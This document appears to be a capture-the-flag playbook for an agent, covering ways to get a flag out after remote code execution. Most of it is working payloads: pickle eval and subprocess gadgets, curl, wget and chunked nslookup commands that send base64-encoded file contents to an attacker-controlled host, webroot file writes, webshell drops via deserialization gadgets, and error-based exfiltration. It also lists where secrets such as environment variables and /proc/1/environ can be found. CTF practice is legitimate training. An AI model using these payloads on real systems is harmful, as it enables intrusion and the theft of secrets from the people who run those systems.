# Extraction Paths — getting the flag OUT of the RCE

## The four egress shapes

```
1. in-band     → the RCE output lands IN the HTTP response
2. OOB-net     → the flag rides a DNS/HTTP fetch back to you
3. OOB-fs      → the flag is written to a file you then fetch
4. error-exfil → the flag rides inside an exception/stack trace
```

## In-band — when the gadget's output is reflected

The cheapest — the response IS the exfil:

```python
# eval so the flag IS the deserialized value:
(eval, ("open('/flag').read()",))
# → the response renders the flag where the object would render
```

```php
// __toString returning the flag — echoed where the object is stringified
O:...:{...:file_get_contents('/flag')...}
```

```java
// a getter/toString gadget whose output is rendered
```

```bash
# the system-command output captured into the value:
(subprocess.check_output, (['cat','/flag'],))
(os.popen('cat /flag').read,)
```

The trick: `os.system('cat /flag')` returns the EXIT CODE (0), not the flag —
use `check_output`/`popen().read()`/`eval(open().read())` to get the CONTENT.

## OOB-network — when output doesn't reflect

```bash
# embed the flag IN the URL the gadget fetches:
curl http://YOU/`cat /flag|base64 -w0`
curl http://YOU/`id|base64|tr -d '\n'`
wget --post-data="$(cat /flag)" http://YOU/x
```

```bash
# DNS-exfil — split into DNS-label-safe chunks:
for i in $(cat /flag|xxd -p|fold -w40); do nslookup $i.YOU; done
nslookup `cat /flag|base64|tr -d '\n'|cut -c1-60`.YOU
```

```python
# the payload in a pickle:
(eval, ("__import__('urllib.request').urlopen('http://YOU/'+__import__('base64').b64encode(open('/flag','rb').read()).decode())",))
```

```bash
# the listener ledger:
python3 tools/web/oob_listener.py serve --port 8000 --log hits.jsonl
python3 tools/web/oob_listener.py hits --log hits.jsonl
# the flag rides the path/body of YOUR OWN callback — verbatim in the log
```

## OOB-filesystem — when egress is dead

```bash
# the gadget writes the flag to a webroot path you can GET:
cat /flag > /var/www/html/x.txt    # then GET /x.txt
cp /flag /var/www/html/            # then GET /flag
```

```bash
# a file-write gadget (AspectJWeaver, FileUpload1, Guzzle/FW,
# SwiftMailer/FW) writes a .php/.jsp/.aspx webshell INTO webroot:
# → GET /shell.php?c=cat%20/flag → the flag in the response
```

The file IS the side-channel — even a fully egress-blocked host can exfil
through a writable webroot.

## Error-exfil — the flag inside an exception

```python
# a reduce that raises with the flag in the message:
(eval, ("exec('raise Exception(open(\"/flag\").read())')",))
# → the 500 body carries the flag in the exception text
```

```java
// a chain whose sink throws: new RuntimeException(new String(Files.readAllBytes("/flag")))
// → the stack trace carries it
```

```php
// a chain that echoes /flag before dying — the body has it
```

The response-body 500 is the channel — the flag rides the error.

## The base64/hex armor — flags with special chars

The flag `flag{a_b\x00\x7f}` breaks a URL/DNS label. Always encode:

```bash
curl http://YOU/`cat /flag|base64 -w0`        # URL-safe
curl http://YOU/`cat /flag|xxd -p|tr -d '\n'` # hex — pure DNS-safe
curl http://YOU/`cat /flag|base32`            # base32 — DNS-safe
```

`tr -d '\n'` on the base64 — the trailing newline breaks the URL.

## The flag-location candidates — where it usually sits

```
/flag  /flag.txt  /flag    flag.txt  /app/flag  /app/flag.txt
/var/www/flag  /var/www/html/flag.txt  ./flag  ./flag.txt
/home/ctf/flag  /root/flag  /tmp/flag
env var: FLAG, FLAG_TOKEN, CTF_FLAG — `env | grep -i flag`
a DB row: SELECT flag FROM flags / SELECT value FROM config WHERE k='flag'
inside another file: /etc/flag.conf, /proc/1/environ, a config file
```

## The "read it to confirm" reflex — before flagging

`cat /flag` output that LOOKS like a flag isn't a flag until `pre-flag` —
the verbatim response or OOB-log line carries it. A `echo flag{fake}` you
typed yourself doesn't count. Always paste the *verbatim* bytes the server
returned.

## The exfil-size constraint

- URL path limit ~8KB → flags fit but big RCE output doesn't → chunk it
- DNS label ≤63 chars, full name ≤253 → split base64 into ≤60-char chunks
- header field ~4-8KB → fine for a flag
- POST body — unlimited → `wget --post-data` for big output

```bash
# chunked DNS exfil for big output:
cat /flag | base64 -w0 | fold -w50 | while read c; do nslookup $c.YOU; done
```

## Output to record

- Which egress shape carried the flag (in-band/OOB-net/OOB-fs/error)
- The verbatim bytes — the response excerpt or the OOB-log line
- The `pre-flag` invocation that wrote it
